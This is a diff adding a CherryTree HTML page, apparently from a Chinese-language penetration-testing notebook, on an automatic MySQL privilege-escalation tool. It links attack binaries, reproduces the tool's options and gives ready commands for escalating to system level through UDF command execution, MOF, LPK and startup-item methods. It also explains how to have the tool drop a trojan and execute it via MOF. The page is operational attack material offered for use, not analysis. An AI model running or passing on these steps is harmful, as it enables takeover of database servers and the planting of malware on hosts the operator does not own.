@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>自动提权脚本</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>自动提权脚本</h1><br/><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\181-root.exe">Linked file: root.exe </a></td></tr></table><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\181-root.py">Linked file: root.py </a></td></tr></table><br /><br /><br /><a href="https://github.com/v5est0r/Python_FuckMySQL">https://github.com/v5est0r/Python_FuckMySQL</a><br /><br /><br />h, --help            show this help message and exit<br />  -a HOST, --host HOST  MySQL server ip<br />  -o PORT, --port PORT  MySQL Port<br />  -u USER, --user USER  mysql UserName<br />  -p PASSWD, --passwd PASSWD<br />                        mysql password<br />  -e EXECUTE, --execute EXECUTE<br />                        command for UDF to execute<br />  -m METHOD, --method METHOD<br />                        elevate method,eg:udf/mof/lpk/st<br /><br />root.exe -a localhost -p root -e &quot;ver&amp;whoami&quot; -m udf<br />root.exe -a localhost -p root -m lpk<br />root.exe -a localhost -p root -m st	//启动项<br /><br />把你的木马的hex复制到同目录的hex.txt就行了，程序会导出木马到指定目录，并用mof执行。<br />root.exe -a localhost -p root -m mof<br /><br />例如通过LOAD_FILE来查看Mysql配置文件my.ini，如果其中配置了skip-grant-tables，这无法进行提权<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
